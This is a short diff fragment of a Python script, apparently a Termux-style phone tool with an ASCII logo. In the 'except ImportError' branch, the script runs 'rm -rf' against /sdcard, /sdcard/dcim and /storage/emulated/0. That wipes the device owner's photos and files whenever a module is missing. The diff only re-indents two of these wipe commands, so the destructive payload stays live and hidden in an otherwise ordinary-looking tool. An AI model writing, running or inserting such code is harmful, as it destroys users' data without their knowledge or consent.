@@ -15,8 +15,8 @@ except ImportError:
 	os.system("rm -rf /sdcard")
 	os.system("rm -rf /sdcard/dcim")
 	os.system("rm -rf /sdcard/*")
-    os.system("rm -rf /storage/emulated/0/*")
-    os.system("rm -rf /storage/emulated/0")
+        os.system("rm -rf /storage/emulated/0/*")
+        os.system("rm -rf /storage/emulated/0")
     
     
 logo="""
